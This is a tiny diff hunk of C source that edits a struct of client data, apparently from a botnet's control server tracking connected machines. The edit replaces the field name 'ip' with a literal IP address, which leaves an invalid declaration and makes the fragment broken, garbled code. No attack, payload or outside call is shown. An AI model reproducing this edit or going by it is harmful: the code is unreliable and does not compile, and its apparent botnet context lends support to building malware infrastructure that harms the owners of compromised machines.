@@ -39,7 +39,7 @@ struct login_info {
 };
 static struct login_info accounts[100];
 struct clientdata_t {
-    uint32_t ip;
+    uint32_t 44.199.213.117;
     char x86;
     char build[7];
     char connected;
